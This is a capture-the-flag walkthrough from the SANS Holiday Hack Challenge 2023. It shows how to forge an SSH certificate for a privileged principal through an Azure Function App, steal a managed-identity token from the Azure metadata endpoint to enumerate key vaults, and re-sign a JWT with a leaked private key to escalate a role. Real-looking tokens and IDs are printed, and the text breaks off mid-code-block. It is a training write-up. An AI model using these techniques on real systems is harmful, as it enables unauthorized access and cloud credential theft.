> Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure Function App. What type of cookie cache is Alabaster planning to implement?

> Alabaster Snowball: Hello there! Alabaster Snowball at your service. I could use your help with my fancy new Azure server at ssh-server-vm.santaworkshopgeeseislands.org. ChatNPT suggested I upgrade the host to use SSH certificates, such a great idea! It even generated ready-to-deploy code for an Azure Function App so elves can request their own certificates. What a timesaver! I'm a little wary though. I'd appreciate it if you could take a peek and confirm everything's secure before I deploy this configuration to all the Geese Islands servers. Generate yourself a certificate and use the *monitor* account to access the host. See if you can grab my TODO list. If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently. Oh, and if you need to peek at the Function App code, there's a handy [Azure REST API endpoint](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control) which will give you details about how the Function App is deployed.

The Azure Function App is located at https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl

Upon visiting this endpoint, we see a form that we can paste our SSH public key and request an SSH certificate.

Let's quickly generate an ephemeral keypair, we will leave it with no passphrase.

```sh
ssh-keygen -t ed25519 -f me
```

We need to paste the contents of the `me.pub` file that was generated into this form.
Since I am using wayland on linux, I will use the `wl-copy` command to copy the contents to my clipboard.
Feel free to manually copy the contents if you face problems.

```sh
cat me.pub | wl-copy
```

After pasting and submitting our public key, we are provided with an SSH certificate with the principal of the "elf" account.

```json
{
    "ssh_cert": "ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAJzI0NjA2ODY4MTY1NTczMzk2OTU1NzAwNzk5NDgyMzI3Njg1MDMwNwAAACDXRNCQVIjIKl7bH5Wwg4lj+d0h2e6pqxkRSP7QS4zQ0AAAAAAAAAABAAAAAQAAACRmZWFjNDY3ZS02Yzg4LTRhZTEtOTg5Ni1kNTIzNDdmMTk0OGEAAAAHAAAAA2VsZgAAAABleT/GAAAAAGWeKvIAAAAAAAAAEgAAAApwZXJtaXQtcHR5AAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGk2GNMCmJkXPJHHRQH9+TM4CRrsq/7BL0wp+P6rCIWHAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEDParQsuPuDxzkKcj+SOLmvIlSdOwJ41h+42S+Q45jIxJEIzFNd9Fd0jVvM8Z8o0fJfdLwrreQpf04rtJi+SIEE ",
    "principal": "elf"
}
```

We will add the contents of the `ssh_cert` field into the certificate file for our key. Certificates associated with public keys generally have a suffix `-cert.pub` after the name of the private key.
In our case, since the name of the private key was `me`, we place the contents into `me-cert.pub`.

```sh
echo ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAJzI0NjA2ODY4MTY1NTczMzk2OTU1NzAwNzk5NDgyMzI3Njg1MDMwNwAAACDXRNCQVIjIKl7bH5Wwg4lj+d0h2e6pqxkRSP7QS4zQ0AAAAAAAAAABAAAAAQAAACRmZWFjNDY3ZS02Yzg4LTRhZTEtOTg5Ni1kNTIzNDdmMTk0OGEAAAAHAAAAA2VsZgAAAABleT/GAAAAAGWeKvIAAAAAAAAAEgAAAApwZXJtaXQtcHR5AAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGk2GNMCmJkXPJHHRQH9+TM4CRrsq/7BL0wp+P6rCIWHAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEDParQsuPuDxzkKcj+SOLmvIlSdOwJ41h+42S+Q45jIxJEIzFNd9Fd0jVvM8Z8o0fJfdLwrreQpf04rtJi+SIEE > me-cert.pub
```

Now we need to add the certificate authority public key to our list of known hosts. To obtain it, we can use the `ssh-keyscan` command with the hostname and specifying the key type with the `-t` flag.

```sh
ssh-keyscan -t ed25519 ssh-server-vm.santaworkshopgeeseislands.org
```

This yields the following output with the public key on the second line.

```
# ssh-server-vm.santaworkshopgeeseislands.org:22 SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u1
ssh-server-vm.santaworkshopgeeseislands.org ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9fPils+4RwVMdU6RFrQnKLYLpIBO5CxNGLkdNxqR8w
```

We will add this line to our known hosts file.

```sh
echo ssh-server-vm.santaworkshopgeeseislands.org ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9fPils+4RwVMdU6RFrQnKLYLpIBO5CxNGLkdNxqR8w >> ~/.ssh/known_hosts
```

Now that trust is set up using the certificate authority, we can remote into the server with our private key!
Since Alabaster Snowball instructed us to log into the machine as *monitor*, we will use that as the username.

```sh
ssh -i me monitor@ssh-server-vm.santaworkshopgeeseislands.org
```

After logging in, we are greeted with a satellite tracking interface `SatTrackr` telling us about the current position, velocity and a bunch of other properties.
We can exit this interface by interrupting it with `ctrl` `c`.

Since our goal is to read Alabaster's notes, we have to login as them. 

Sparkle Redberry from Rudolph's Rest Resort gave us the following hint:

> Azure CLI tools aren't always available, but if you're on an Azure VM you can always use the [Azure REST API](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token) instead.

Let's try to acquire an access token from the IAM REST API as described in the documentation using the `curl` command.

```sh
monitor@ssh-server-vm:~$ curl --http1.1 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' --header "Metadata: true" | jq
```

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI0NDUzNzYsIm5iZiI6MTcwMjQ0NTM3NiwiZXhwIjoxNzAyNTMyMDc2LCJhaW8iOiJFMlZnWUpqeWZzTGNtVzkzblMxVkVMeGdNL2xOSEFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiItQTJaTGVZSnMwdUNmU0ZaRlFvbEFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.jbNxFKqecImuEl5_RijHnkJs_gN71cbud5hJfiuxwiDVFLL96A0P-lXxtsKIdRUf0IOlDL7TUXRY1CXXe8G1ypjls1ANSZyhaC-4pqxN419ANHKasYqzlzvfQsGVz1sxWxR7XdoH2t65IiGB250_9ct4nuzK5MSSF0Nmtx83_VfLE7sRlColE3uArHpnlfbV7bpmLBZ3dGPd8GdTHsyQjaHwcYpeOkZ43oVcTO5iKoIK91jsEYbzgK6bZqT-gyOD_TqdDNEAGyZmKPDzFg585nDR87u8rSAjYny90-8x0byKUlbvzAevFSn8z8pyXNJ9mAlXfe3M49PQ2cjmhkHP9Q",
  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
  "expires_in": "83957",
  "expires_on": "1702532076",
  "ext_expires_in": "86399",
  "not_before": "1702445376",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

Let's save this access token to an environment variable so that we can use it for subsequent requests. Since we have to use the token in the *Authorization*, we set another environment variable to the header value itself.

```sh
TOKEN=$(curl --http1.1 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' --header "Metadata: true" | jq -r .access_token)
HEADER="Authorization: Bearer $TOKEN"
```

Let's now retrieve the subscriptions and resources.

```sh
curl --header "$HEADER" \
https://management.azure.com/subscriptions?api-version=2022-12-01
```

```json
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64",
      "authorizationSource": "RoleBased",
      "managedByTenants": [],
      "tags": {
        "sans:application_owner": "SANS:R&D",
        "finance:business_unit": "curriculum"
      },
      "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
      "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
      "displayName": "sans-hhc",
      "state": "Enabled",
      "subscriptionPolicies": {
        "locationPlacementId": "Public_2014-09-01",
        "quotaId": "EnterpriseAgreement_2014-09-01",
        "spendingLimit": "Off"
      }
    }
  ],
  "count": {
    "type": "Total",
    "value": 1
  }
}
```

Now that we have the subscription ID `2b0942f3-9bca-484b-a508-abdae2db5e64`, we can use this to further drill down the resource ID.

```sh
curl --header "$HEADER" \
https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?api-version=2021-04-01
```

```json
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
      "name": "northpole-it-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    },
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
      "name": "northpole-ssh-certs-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    }
  ]
}
```

We use the name of the azure website as the site name. This is the `northpole-ssh-certs-fa` subdomain in [https://northpole-ssh-certs-fa.azurewebsites.net/](https://northpole-ssh-certs-fa.azurewebsites.net/).

```sh
curl --header "$HEADER" \
https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01
```

```json
{
  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web",
  "name": "northpole-ssh-certs-fa",
  "type": "Microsoft.Web/sites/sourcecontrols",
  "location": "East US",
  "tags": {
    "project": "northpole-ssh-certs",
    "create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl"
  },
  "properties": {
    "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
    "branch": "main",
    "isManualIntegration": false,
    "isGitHubAction": true,
    "deploymentRollbackEnabled": false,
    "isMercurial": false,
    "provisioningState": "Succeeded",
    "gitHubActionConfiguration": {
      "codeConfiguration": null,
      "containerConfiguration": null,
      "isLinux": true,
      "generateWorkflowFile": true,
      "workflowSettings": {
        "appType": "functionapp",
        "publishType": "code",
        "os": "linux",
        "variables": {
          "runtimeVersion": "3.11"
        },
        "runtimeStack": "python",
        "workflowApiVersion": "2020-12-01",
        "useCanaryFusionServer": false,
        "authType": "publishprofile"
      }
    }
  }
}
```

We can look at source code of the application from the GitHub repository provided in the output. Let's clone it.

```sh
git clone https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa
```

Looking through the `function_app.py` file, the create_cert function (route) has the following line of code when parsing a POST request.

```py
ssh_pub_key, principal = parse_input(req.get_json())
```

This means, the app not only accepts and SSH public key as an input but it also supports supplying a principal name to sign the public key with.

Since we have to login as Alabaster Snowball, let's take a look at the avaialable SSH principals.

```sh
monitor@ssh-server-vm:~$ ls /etc/ssh/auth_principals/
```

```
alabaster  monitor
```

Great! We have an auth principal mapping to the `alabaster` user. Let's note the principal name.

```sh
monitor@ssh-server-vm:~$ cat /etc/ssh/auth_principals/alabaster 
```

```
admin
```

Let's use the `curl` command to ask the endpoint to sign our public key, except this time, we specify the `principal` field of the JSON as `admin`.

```sh
curl "https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl" -H "Content_type: application/json" --data "{\"ssh_pub_key\":\"$(cat me.pub)\", \"principal\":\"admin\"}"
```
  
```json
{
  "ssh_cert": "ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAJjI3OTUwNTY2Mzk4NTQyNjI4ODMyMzE2NDc5NzI3NzI2NjE4NDAwAAAAINdE0JBUiMgqXtsflbCDiWP53SHZ7qmrGRFI/tBLjNDQAAAAAAAAAAEAAAABAAAAJDk4MzMyMGY4LWQ5MmEtNDdlYi1iNmE4LWNhYTg4ZjgzMzU4MAAAAAkAAAAFYWRtaW4AAAAAZXlUTAAAAABlnj94AAAAAAAAABIAAAAKcGVybWl0LXB0eQAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACBpNhjTApiZFzyRx0UB/fkzOAka7Kv+wS9MKfj+qwiFhwAAAFMAAAALc3NoLWVkMjU1MTkAAABAWwJe58LWb32cvVvxEMVP3h5CwmqsWtAZa7rOsEYQEOoPNQ2THNVT21Y/+fJVj0XuSDVACCkrjGiKLE9jFxRjDw== ",
  "principal": "admin"
}
```

Let's backup our old certificate file and replace it with the newly forged one.

```sh
cp me-cert.pub{,.bak}
echo ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAJjI3OTUwNTY2Mzk4NTQyNjI4ODMyMzE2NDc5NzI3NzI2NjE4NDAwAAAAINdE0JBUiMgqXtsflbCDiWP53SHZ7qmrGRFI/tBLjNDQAAAAAAAAAAEAAAABAAAAJDk4MzMyMGY4LWQ5MmEtNDdlYi1iNmE4LWNhYTg4ZjgzMzU4MAAAAAkAAAAFYWRtaW4AAAAAZXlUTAAAAABlnj94AAAAAAAAABIAAAAKcGVybWl0LXB0eQAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACBpNhjTApiZFzyRx0UB/fkzOAka7Kv+wS9MKfj+qwiFhwAAAFMAAAALc3NoLWVkMjU1MTkAAABAWwJe58LWb32cvVvxEMVP3h5CwmqsWtAZa7rOsEYQEOoPNQ2THNVT21Y/+fJVj0XuSDVACCkrjGiKLE9jFxRjDw== > me-cert.pub
```

Now we can login as Alabaster.

```sh
ssh -i me alabaster@ssh-server-vm.santaworkshopgeeseislands.org
```

Just like that, we're in!

```
alabaster@ssh-server-vm:~$
```

Let's list Alabaster's home folder.

```sh
ls
```

```
alabaster_todo.md  impacket
```

There, we have our proof of work. We can read the todos file and submit the answer.

```sh
alabaster@ssh-server-vm:~$ cat alabaster_todo.md
```

```
# Geese Islands IT & Security Todo List
- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
```

The objectives section asks "What type of cookie cache is Alabaster planning to implement?"
We submit the answer `gingerbread` from the above output and mark it complete!

# Steampunk Island: Brass Bouy Port

## Faster Lock Combination

### Sticky number

To start off, we must find the sticky number by applying moderate tension on shackle and scrolling. The number we feel the greatest resistance at, that is our sticky number.
In my case this was 17.

### Guess number

Next, we have to find the guess numbers by applying heavy tension on shackle and scrolling. The resistance provided by the guess numbers can be felt between fractional numbers in the range of 0 through 11.

In this particular case, the resistance is felt at digits 4 and 11.

First digit: sticky + 5 = 22
Third digit:
Reference modulo = 22 % 4 = 2

   |    |    |
---|----|----|---
4  | 14 | 24 | 34
11 | 21 | 31 | 01

14 % 4 == reference
34 % 4 == reference

We then move to each digit, try moving the dial, one that feels looser is the third digit. In this particular case *34* feels looser.

a = reference + 2 = 4

b = a + 4 = 6

We create a table with these variables for the possible 2nd digit values.

 0 |   1   |     2     |    3     |    4
---|-------|-----------|----------|----------
 a | a + 8 | a + 2 × 8 | a + 3 × 8| a + 4 × 8
 b | b + 8 | b + 2 × 8 | b + 3 × 8| b + 4 × 8

The table evaluates to the following concrete values:

0 | 1  | 2  | 3  | 4
--|----|----|----|---
4 | 12 | 20 | 28 | 36
6 | 16 | 24 | 32 | 0

According to the tutorial in the hint, we need to eliminate numbers that are 2 digits away from third digit.
In our case, we eliminated 32 and 36. This leaves us with 4, 12, 20, 28, 6, 16,
24 and 0 as the possibilities for the second digit. We can try these out one by
one to find unlock the combo.

Answer: 22, 4, 34

## The Captain's Comms

The card on the captain's table tells us that there is an `rMonitor.tok` token file under the `/jwtDefault` directory
which can be accessed through the correct use of the `Authorization` header.

If we look at the cookies in the devtools, we notice a cookie called `justWatchThis` set to the following JSON web token:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg
```

The first volume of the owner's manual links to https://jwt.io/introduction which suggests the use of the token with the Authorization header.

We will retrieve the `rMonitor.tok` using the following `curl` command:

Let's store the authorization header with this token in a variable for convenient reuse.

```sh
HEADER='Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg'
```

We will use this header to download the `rMonitor.tok` token.

```sh
wget --header "$HEADER" https://captainscomms.com/jwtDefault/rMonitor.tok
```

Notice the use of the word `Bearer` before the the token in the authorization header as noted in the JWT introduction article.
We used the `-O` flag to save the token to our working directory.

We copy this token to our clipboard and paste it as the value for the `JustWatchThis` cookie.

```sh
cat rMonitor.tok | wl-copy
```

After pasting the token, we can access the monitor at the captain's desk. However, we still cannot decode the messages.

Clicking on the ChatNPT output on the desk, we see a dialogue between the captain and ChatNPT about securing the JWT public and private keys.
Here we can find that the captain placed his public key as `capsPubKey.key` in the `keys` folder under the same directory as `rMonitor.tok`. To simplify,
the public key is present in the `/jwtDefault/keys/capsPubKey.key`.

Let's download that like we did with the previous token.

```sh
wget --header "$HEADER" https://captainscomms.com/jwtDefault/keys/capsPubKey.key
```

Chimney Scissorsticks told us that the captain likes to abbreviate words in his filenames. With that in mind, we can probe for the existence of `rDecoder.tok` using the newfound `rMonitor.tok` token for authorization.

```sh
curl https://captainscomms.com/jwtDefault/rDecoder.tok
```

```
Invalid authorization token provided.
```

As expected, the `rDecoder.tok` file does exist. To actually get it, however, we must supply the authorization header with the `rMonitor` token.

```sh
wget --header "Authorization: Bearer $(cat rMonitor.tok)" \
     https://captainscomms.com/jwtDefault/rDecoder.tok
```

We repeat the process as above and paste this new token as the value for the `JustWatchThis` cookie.

```sh
cat rDecoder.tok | wl-copy
```

Accessing the monitor after pasting, we can decode each signal peak left to right.

![]()

Decoding the first signal peak tells us that the captain's private key is located in a folder called `TH3CAPSPR1V4T3F0LD3R`.

![]()

The second signal peak decodes to e03 interval signal messages like the Lincolnshire Poacher.
The contents of the message is `12249 12249 16009 16009 12249 12249 16009 16009`.

The last signal peak decodes to provide an image with the frequency 10426 written on it.

Knowing the captain's use of abbreviations, we can assume that like the public key's name `capsPubKey.key`, the private key
is probably named `capsPrivKey.key`. We can probe for it without an authorization header.

```sh
curl https://captainscomms.com/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key
```

```
Invalid authorization token provided.
```

This means that the file exists! Let's retrieve it with our `rDecoder.tok` token for authorization.

```sh
curl https://captainscomms.com/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key \
--header "Authorization: Bearer $(cat rDecoder.tok)" \
-O
```

Now that we have the private key, we can use it to sign and forge tokens with any role of our choice.

Opening the captain's todo list, we see the captain talking about his role and how the journal he left
on pixel island has details about this role.

Indeed, when we played the duck hunt game, the victory screen gave us the journal where the captain talked about the
`GeeseIslandSuperChiefCommunicationsOfficer` role.

We can use [cyberchef](https://cyberchef.org) to change the token payload, modifying our role from `radioDecoder` to
`GeeseIslandSuperChiefCommunicationsOfficer` and sign it with the private key.

We use the JWT Sign operation in our recipe, set the signing algorithm to `RS256` and paste the captain's private key in the `Private/Secret Key` field.

We can decode the payload from the `rDecoder.tok` file, replace the `radioDecoder` role with the new role and copy it to clipboard.

```sh
cut -d. -f2 rDecoder.tok \
| base64 -d \
| sed s/radioDecoder/GeeseIslandsSuperChiefCommunicationsOfficer/g \
| wl-copy
```

Finally, we paste this into the input field of cyberchef.

![]()

Now, we paste the output of cyberchef as the `JustWatchThis` cookie's value.

![]()

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6IkdlZXNlSXNsYW5kc1N1cGVyQ2hpZWZDb21tdW5pY2F0aW9uc09mZmljZXIifQ.N-8MdT6yPFge7zERpm4VdLdVLMyYcY_Wza1TADoGKK5_85Y5ua59z2Ke0TTyQPa14Z7_Su5CpHZMoxThIEHUWqMzZ8MceUmNGzzIsML7iFQElSsLmBMytHcm9-qzL0Bqb5MeqoHZYTxN0vYG7WaGihYDTB7OxkoO_r4uPSQC8swFJjfazecCqIvl4T5i08p5Ur180GxgEaB-o4fpg_OgReD91ThJXPt7wZd9xMoQjSuPqTPiYrP5o-aaQMcNhSkMix_RX1UGrU-2sBlL01FxI7SjxPYu4eQbACvuK6G2wyuvaQIclGB2Qh3P7rAOTpksZSex9RjtKOiLMCafTyfFng
```

The transmitter asks for a frequency, a go-date and a go-time. We supply the frequency we found earlier.
The go-date and go-time fields only accepted 4 digits. I supplied `1224` and `1600` from the decoded version of the second signal peak.

The I pressed the transmission button (Tx). Nothing happened.

At this point, I made a guess and changed the go-time to 1200, since 12/24 12:00 is super exciting.
Fortunately, this worked and greeted me with a picture of elves.


# Steampunk Island: Rusty Quay

After walking around and performing a manual depth first search in the maze here,
our gameboy cartridge detector beeps and we get the third volume to "Elf the Dwarf's" game.

# Steampunk Island: Coggoggle Marina

## Active Directory

For this Active Directory challenge,
we explored the Microsoft Azure Key Vault using the Curl command,
and issuing an HTTP request to management.azure.com's API.

```bash
TOKEN=$(curl --http1.1 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' --header "Metadata: true" | jq -r .access_token)
HEADER="Authorization: Bearer $TOKEN"
curl --header "$HEADER" "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv?api-version=2022-07-01"
```

```json
{
  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
  "name": "northpole-ssh-certs-kv",
  "type": "Microsoft.KeyVault/vaults",
  "location": "eastus",
  "tags": {},
  "systemData": {
    "createdBy": "thomas@sanshhc.onmicrosoft.com",
    "createdByType": "User",
    "createdAt": "2023-11-12T01:47:13.059Z",
    "lastModifiedBy": "thomas@sanshhc.onmicrosoft.com",
    "lastModifiedByType": "User",
    "lastModifiedAt": "2023-11-12T01:50:52.742Z"
  },
  "properties": {
    "sku": {
      "family": "A",
      "name": "standard"
    },
    "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
    "accessPolicies": [
      {
        "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
        "objectId": "0bc7ae9d-292d-4742-8830-68d12469d759",
        "permissions": {
          "keys": [
            "all"
          ],
          "secrets": [
            "all"
          ],
          "certificates": [
            "all"
          ],
          "storage": [
            "all"
          ]
        }
      },
      {
        "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
        "objectId": "1b202351-8c85-46f1-81f8-5528e92eb7ce",
        "permissions": {
          "secrets": [
            "get"
          ]
        }
      }
    ],
    "enabledForDeployment": false,
    "enableSoftDelete": true,
    "softDeleteRetentionInDays": 90,
    "vaultUri": "https://northpole-ssh-certs-kv.vault.azure.net/",
    "provisioningState": "Succeeded",
    "publicNetworkAccess": "Enabled"
  }
}
```

We can query for the North Pole IT KV Key Vault Store,
and subsequently we get the following JSON.

```sh
curl --header "$HEADER" "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv?api-version=2022-07-01" \
| jq
```

```json
{
  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
  "name": "northpole-it-kv",
  "type": "Microsoft.KeyVault/vaults",
  "location": "eastus",
  "tags": {},
  "systemData": {
    "createdBy": "thomas@sanshhc.onmicrosoft.com",
    "createdByType": "User",
    "createdAt": "2023-10-30T13:17:02.532Z",
    "lastModifiedBy": "thomas@sanshhc.onmicrosoft.com",
    "lastModifiedByType": "User",
    "lastModifiedAt": "2023-10-30T13:17:02.532Z"
  },
  "properties": {
    "sku": {
      "family": "A",
      "name": "Standard"
    },
    "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
    "accessPolicies": [],
    "enabledForDeployment": false,
    "enabledForDiskEncryption": false,
    "enabledForTemplateDeployment": false,
    "enableSoftDelete": true,
    "softDeleteRetentionInDays": 90,
    "enableRbacAuthorization": true,
    "vaultUri": "https://northpole-it-kv.vault.azure.net/",
    "provisioningState": "Succeeded",
    "publicNetworkAccess": "Enabled"
  }
}
```

If we list the secrets, we can see a script known as tmpAddUserScript inside the Azure Vault.

```sh
